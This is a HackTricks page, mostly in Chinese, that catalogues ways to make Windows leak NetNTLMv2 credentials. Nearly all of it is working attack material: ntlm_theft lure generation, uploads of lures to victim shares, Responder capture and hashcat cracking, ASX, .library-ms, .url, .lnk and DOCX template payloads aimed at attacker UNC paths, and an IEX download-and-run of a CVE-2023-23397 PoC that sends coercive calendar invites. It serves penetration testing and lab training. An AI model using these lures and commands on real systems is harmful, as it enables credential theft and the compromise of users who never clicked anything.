# 用于窃取 NTLM creds 的位置

{{#include ../../banners/hacktricks-training.md}}

**查看来自 [https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/) 的所有精彩想法，范围从在线下载 Microsoft Word 文件 到 ntlm leaks source: https://github.com/soufianetahiri/TeamsNTLMLeak/blob/main/README.md 以及 [https://github.com/p0dalirius/windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)**

### Writable SMB share + Explorer-triggered UNC lures (ntlm_theft/SCF/LNK/library-ms/desktop.ini)

如果你能 **写入用户或计划任务在 Explorer 中浏览的共享**，放置元数据指向你的 UNC（例如 `\\ATTACKER\share`）的文件。渲染该文件夹会触发 **implicit SMB authentication** 并 leaks a **NetNTLMv2** to your listener。

1. **生成诱饵**（涵盖 SCF/URL/LNK/library-ms/desktop.ini/Office/RTF 等）
```bash
git clone https://github.com/Greenwolf/ntlm_theft && cd ntlm_theft
uv add --script ntlm_theft.py xlsxwriter
uv run ntlm_theft.py -g all -s <attacker_ip> -f lure
```
2. **将它们放到可写的共享文件夹** (受害者打开的任何文件夹):
```bash
smbclient //victim/share -U 'guest%'
cd transfer\
prompt off
mput lure/*
```
3. **监听并 crack**:
```bash
sudo responder -I <iface>          # capture NetNTLMv2
hashcat hashes.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt  # autodetects mode 5600
```
Windows 可能会同时访问多个文件；任何 Explorer 预览（`BROWSE TO FOLDER`）都不需要点击。

### Windows Media Player playlists (.ASX/.WAX)

如果你能让目标打开或预览你控制的 Windows Media Player 播放列表，你可以通过将条目指向 UNC 路径来 leak Net‑NTLMv2。WMP 会尝试通过 SMB 获取引用的媒体并隐式地进行身份验证。

示例 payload:
```xml
<asx version="3.0">
<title>Leak</title>
<entry>
<title></title>
<ref href="file://ATTACKER_IP\\share\\track.mp3" />
</entry>
</asx>
```
收集与破解流程：
```bash
# Capture the authentication
sudo Responder -I <iface>

# Crack the captured NetNTLMv2
hashcat hashes.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt
```
### 嵌入 ZIP 的 .library-ms NTLM leak (CVE-2025-24071/24055)

Windows Explorer 在直接从 ZIP 存档中打开 .library-ms 文件时会不安全地处理它们。如果库定义指向远程 UNC 路径（例如 \\attacker\share），仅在 ZIP 中浏览/启动 .library-ms 就会导致 Explorer 枚举该 UNC 并向攻击者发送 NTLM 身份验证。这样会产生一个 NetNTLMv2，可以离线破解或可能被中继。

指向攻击者 UNC 的最小 .library-ms
```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<version>6</version>
<name>Company Documents</name>
<isLibraryPinned>false</isLibraryPinned>
<iconReference>shell32.dll,-235</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<simpleLocation>
<url>\\10.10.14.2\share</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
```
Operational steps
- 使用上面的 XML 创建 .library-ms 文件（设置你的 IP/hostname）。
- 将其压缩为 ZIP（在 Windows 上：Send to → Compressed (zipped) folder），并将 ZIP 交付给目标。
- 运行一个 NTLM capture listener，等待受害者从 ZIP 内打开 .library-ms。

### Outlook 日历提醒声音路径 (CVE-2023-23397) – zero‑click Net‑NTLMv2 leak

Microsoft Outlook for Windows 会在日历项目中处理扩展的 MAPI 属性 PidLidReminderFileParameter。如果该属性指向一个 UNC path（例如 \\attacker\share\alert.wav），当提醒触发时 Outlook 会访问该 SMB 共享，从而在不需任何点击的情况下泄露用户的 Net‑NTLMv2。该问题已于 March 14, 2023 修补，但对于遗留/未被触及的设备群以及历史事件响应仍高度相关。

Quick exploitation with PowerShell (Outlook COM):
```powershell
# Run on a host with Outlook installed and a configured mailbox
IEX (iwr -UseBasicParsing https://raw.githubusercontent.com/api0cradle/CVE-2023-23397-POC-Powershell/main/CVE-2023-23397.ps1)
Send-CalendarNTLMLeak -recipient user@example.com -remotefilepath "\\10.10.14.2\share\alert.wav" -meetingsubject "Update" -meetingbody "Please accept"
# Variants supported by the PoC include \\host@80\file.wav and \\host@SSL@443\file.wav
```
监听端：
```bash
sudo responder -I eth0  # or impacket-smbserver to observe connections
```
备注
- 受害者只需在提醒触发时运行 Outlook for Windows。
- 该 leak 会产生 Net‑NTLMv2，适用于 offline cracking 或 relay（不是 pass‑the‑hash）。


### .LNK/.URL 基于图标的零点击 NTLM leak (CVE‑2025‑50154 – 绕过 CVE‑2025‑24054)

Windows Explorer 会自动渲染快捷方式图标。最近的研究表明，即便在 Microsoft 于 2025 年 4 月为 UNC‑icon shortcuts 发布补丁之后，仍然可以通过将快捷方式目标托管在 UNC 路径上并将图标保留为本地，从而在无需点击的情况下触发 NTLM 身份验证（补丁被绕过并被分配为 CVE‑2025‑50154）。仅仅查看文件夹就会导致 Explorer 从远程目标检索元数据，并向攻击者的 SMB 服务器发送 NTLM。

最小 Internet Shortcut payload (.url):
```ini
[InternetShortcut]
URL=http://intranet
IconFile=\\10.10.14.2\share\icon.ico
IconIndex=0
```
程序快捷方式 payload (.lnk) 通过 PowerShell:
```powershell
$lnk = "$env:USERPROFILE\Desktop\lab.lnk"
$w = New-Object -ComObject WScript.Shell
$sc = $w.CreateShortcut($lnk)
$sc.TargetPath = "\\10.10.14.2\share\payload.exe"  # remote UNC target
$sc.IconLocation = "C:\\Windows\\System32\\SHELL32.dll" # local icon to bypass UNC-icon checks
$sc.Save()
```
Delivery ideas
- 将快捷方式放入 ZIP 并诱使受害者浏览它。
- 将快捷方式放在受害者会打开的可写共享上。
- 将其与同一文件夹中的其他诱饵文件组合，以便 Explorer 预览这些项目。

### No-click .LNK NTLM leak via ExtraData icon path (CVE‑2026‑25185)

Windows 在**查看/预览**（图标渲染）时加载 `.lnk` 元数据，而不仅在执行时。CVE‑2026‑25185 显示了一条解析路径，其中 **ExtraData** 块会导致 shell 在**加载期间**解析图标路径并访问文件系统，当该路径为远程时会发出出站 NTLM。

关键触发条件（在 `CShellLink::_LoadFromStream` 中观察到）：
- 包含 **DARWIN_PROPS** (`0xa0000006`) 在 ExtraData 中（进入图标更新例程的门控）。
- 包含 **ICON_ENVIRONMENT_PROPS** (`0xa0000007`) 并且 **TargetUnicode** 已填充。
- 加载器会展开 `TargetUnicode` 中的环境变量，并对得到的路径调用 `PathFileExistsW`。

如果 `TargetUnicode` 解析为 UNC 路径（例如，`\\attacker\share\icon.ico`），**仅仅查看包含快捷方式的文件夹** 就会导致出站认证。同样的加载路径也可能被**索引**和 **AV 扫描**触发，使其成为一个实际可利用的 no‑click leak 表面。

研究工具（parser/generator/UI）可在 **LnkMeMaybe** 项目中获得，用于在不使用 Windows GUI 的情况下构建/检查这些结构。

### Office remote template injection (.docx/.dotm) to coerce NTLM

Office 文档可以引用外部模板。如果将附加模板设置为 UNC 路径，打开文档将对 SMB 进行身份验证。

Minimal DOCX relationship changes (inside word/):

1) Edit word/settings.xml and add the attached template reference:
```xml
<w:attachedTemplate r:id="rId1337" xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"/>
```
2) 编辑 word/_rels/settings.xml.rels 并将 rId1337 指向你的 UNC:
```xml
<Relationship Id="rId1337" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="\\\\10.10.14.2\\share\\template.dotm" TargetMode="External" xmlns="http://schemas.openxmlformats.org/package/2006/relationships"/>
```
3) 重新打包为 .docx 并交付。运行你的 SMB capture listener 并等待被打开。

有关捕获后对 relaying 或滥用 NTLM 的思路，请参阅：

{{#ref}}
README.md
{{#endref}}


## 参考资料
- [HTB: Breach – Writable share lures + Responder capture → NetNTLMv2 crack → Kerberoast svc_mssql](https://0xdf.gitlab.io/2026/02/10/htb-breach.html)
- [HTB Fluffy – ZIP .library‑ms auth leak (CVE‑2025‑24071/24055) → GenericWrite → AD CS ESC16 to DA (0xdf)](https://0xdf.gitlab.io/2025/09/20/htb-fluffy.html)
- [HTB: Media — WMP NTLM leak → NTFS junction to webroot RCE → FullPowers + GodPotato to SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [Morphisec – 5 NTLM vulnerabilities: Unpatched privilege escalation threats in Microsoft](https://www.morphisec.com/blog/5-ntlm-vulnerabilities-unpatched-privilege-escalation-threats-in-microsoft/)
- [MSRC – Microsoft mitigates Outlook EoP (CVE‑2023‑23397) and explains the NTLM leak via PidLidReminderFileParameter](https://www.microsoft.com/en-us/msrc/blog/2023/03/microsoft-mitigates-outlook-elevation-of-privilege-vulnerability/)
- [Cymulate – Zero‑click, one NTLM: Microsoft security patch bypass (CVE‑2025‑50154)](https://cymulate.com/blog/zero-click-one-ntlm-microsoft-security-patch-bypass-cve-2025-50154/)
- [TrustedSec – LnkMeMaybe: A Review of CVE‑2026‑25185](https://trustedsec.com/blog/lnkmemaybe-a-review-of-cve-2026-25185)
- [TrustedSec LnkMeMaybe tooling](https://github.com/trustedsec/LnkMeMaybe)


{{#include ../../banners/hacktricks-training.md}}
